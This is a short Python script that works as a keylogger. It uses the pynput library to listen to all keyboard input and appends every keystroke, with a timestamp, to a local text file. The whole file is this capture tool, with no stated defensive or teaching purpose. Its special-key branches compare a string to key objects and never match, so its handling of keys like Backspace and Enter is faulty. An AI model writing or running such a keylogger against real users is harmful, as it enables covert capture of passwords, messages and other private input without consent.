import os
import time
from pynput.keyboard import Listener, Key

path = "loggedKeys.txt"


def write_file(key):
    with open(path, "a") as file:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        key = str(key).replace("'", "")

        if key == Key.backspace:
            file.write(f"[{timestamp}] Backspace\n")
        elif key == Key.enter:
            file.write(f"[{timestamp}] Enter\n")
        elif key in [Key.shift, Key.shift_r]:
            file.write(f"[{timestamp}] Shift\n")
        elif key == Key.space:
            file.write(f"[{timestamp}] Space\n")
        elif key == Key.caps_lock:
            file.write(f"[{timestamp}] Caps Lock\n")
        else:
            file.write(f"[{timestamp}] {key}\n")


def on_press(key):
    write_file(key)


with Listener(on_press=on_press) as listener:
    listener.join()
